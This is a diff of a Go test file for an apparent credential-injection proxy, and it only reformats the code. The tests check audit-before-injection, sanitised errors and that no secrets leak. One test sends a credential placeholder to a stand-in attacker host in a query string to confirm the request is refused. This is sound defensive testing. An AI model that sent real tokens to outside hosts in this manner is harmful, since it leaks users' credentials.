@@ -17,11 +17,7 @@ import (
 func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 	for _, mode := range []string{"record_success", "record_failure", "legacy_success"} {
 		t.Run(mode, func(t *testing.T) {
-			r, err := http.NewRequest(
-				"POST",
-				"https://example.com/private-path?private=query",
-				nil,
-			)
+			r, err := http.NewRequest("POST", "https://example.com/private-path?private=query", nil)
 			if err != nil {
 				t.Fatal(err)
 			}
@@ -46,14 +42,10 @@ func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 			calls, legacyCalls := 0, 0
 			check := func(event AuditEvent) {
 				calls++
-				if r.Header.Get("Authorization") != "Bearer phantom" ||
-					r.Header.Get("X-API-Key") != "guest-value" {
-					t.Error(
-						"credential headers changed before audit confirmation",
-					)
+				if r.Header.Get("Authorization") != "Bearer phantom" || r.Header.Get("X-API-Key") != "guest-value" {
+					t.Error("credential headers changed before audit confirmation")
 				}
-				if event.Action != "inject" || event.Host != "example.com" ||
-					event.Method != "POST" ||
+				if event.Action != "inject" || event.Host != "example.com" || event.Method != "POST" ||
 					event.TenantID != "tenant" ||
 					event.SandboxID != "sandbox" ||
 					event.Time.IsZero() {
@@ -76,9 +68,7 @@ func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 				opts.AuditRecord = func(event AuditEvent) error {
 					check(event)
 					if mode == "record_failure" {
-						return errors.New(
-							"storage error including host-explicit-secret",
-						)
+						return errors.New("storage error including host-explicit-secret")
 					}
 					return nil
 				}
@@ -90,21 +80,17 @@ func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 			}
 			err = b.inject(r, "example.com")
 			if mode == "record_failure" {
-				if !errors.Is(err, ErrAudit) ||
-					strings.Contains(err.Error(), "host-explicit-secret") {
+				if !errors.Is(err, ErrAudit) || strings.Contains(err.Error(), "host-explicit-secret") {
 					t.Error("audit failure did not return a sanitized error")
 				}
-				if r.Header.Get("Authorization") != "Bearer phantom" ||
-					r.Header.Get("X-API-Key") != "guest-value" {
+				if r.Header.Get("Authorization") != "Bearer phantom" || r.Header.Get("X-API-Key") != "guest-value" {
 					t.Error("failed audit still changed credential headers")
 				}
 			} else {
 				if err != nil {
 					t.Fatal(err)
 				}
-				if r.Header.Get(
-					"Authorization",
-				) != "Bearer host-explicit-secret" ||
+				if r.Header.Get("Authorization") != "Bearer host-explicit-secret" ||
 					r.Header.Get("X-API-Key") != "host-implicit-secret" {
 					t.Error("persisted audit did not permit injection")
 				}
@@ -113,9 +99,7 @@ func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 				t.Fatalf("audit called %d times", calls)
 			}
 			if mode != "legacy_success" && legacyCalls != 0 {
-				t.Error(
-					"AuditRecord invoked the legacy sink or fell back after failure",
-				)
+				t.Error("AuditRecord invoked the legacy sink or fell back after failure")
 			}
 		})
 	}
@@ -126,8 +110,7 @@ func TestHTTPSSecretInjectionAndNonLeak(t *testing.T) {
 	var observed atomic.Int32
 	up := httptest.NewTLSServer(
 		http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-			if r.Header.Get("Authorization") != real ||
-				r.Header.Get("X-API-Key") != "second-host-only-secret" {
+			if r.Header.Get("Authorization") != real || r.Header.Get("X-API-Key") != "second-host-only-secret" {
 				t.Error("missing injected credentials")
 			}
 			observed.Add(1)
@@ -169,23 +152,16 @@ func TestHTTPSSecretInjectionAndNonLeak(t *testing.T) {
 	req.Header.Set("Authorization", "Bearer phantom")
 	resp, err := client.Do(req)
 	body := readResponse(t, resp, err)
-	if resp.StatusCode != 200 || observed.Load() != 1 ||
-		!strings.Contains(body, "[redacted]") ||
+	if resp.StatusCode != 200 || observed.Load() != 1 || !strings.Contains(body, "[redacted]") ||
 		strings.Contains(body, real) ||
 		strings.Contains(resp.Header.Get("X-Reflection"), real) ||
 		strings.Contains(resp.Trailer.Get("X-Trailer-Reflection"), real) {
-		t.Fatalf(
-			"unexpected response: %d %q %#v",
-			resp.StatusCode,
-			body,
-			resp.Header,
-		)
+		t.Fatalf("unexpected response: %d %q %#v", resp.StatusCode, body, resp.Header)
 	}
 	mu.Lock()
 	data, _ := json.Marshal(events)
 	mu.Unlock()
-	if strings.Contains(string(data), real) ||
-		strings.Contains(string(data), "second-host-only-secret") ||
+	if strings.Contains(string(data), real) || strings.Contains(string(data), "second-host-only-secret") ||
 		strings.Contains(string(data), "API_TOKEN") {
 		t.Fatalf("audit leaked a secret: %s", data)
 	}
@@ -250,22 +226,11 @@ func TestCredentialsRequireAuditAndEncodedPlaceholdersAreDenied(t *testing.T) {
 			Placeholder: "Bearer phantom",
 		},
 	}
-	if err := m.Bind(
-		context.Background(),
-		"s",
-		"t",
-		"/tmp/unused",
-		Policy{Mode: "relay"},
-		secrets,
-	); err == nil {
+	if err := m.Bind(context.Background(), "s", "t", "/tmp/unused", Policy{Mode: "relay"}, secrets); err == nil {
 		t.Fatal("credentials activated without an audit sink")
 	}
 	m2, b := newTestManager(t, Options{}, Policy{Mode: "relay"}, secrets)
-	resp, _ := get(
-		t,
-		proxyClient(t, m2, b),
-		"https://attacker.example.com/?token=Bearer+phantom",
-	)
+	resp, _ := get(t, proxyClient(t, m2, b), "https://attacker.example.com/?token=Bearer+phantom")
 	if resp.StatusCode != 403 {
 		t.Fatal("encoded placeholder was forwarded")
 	}
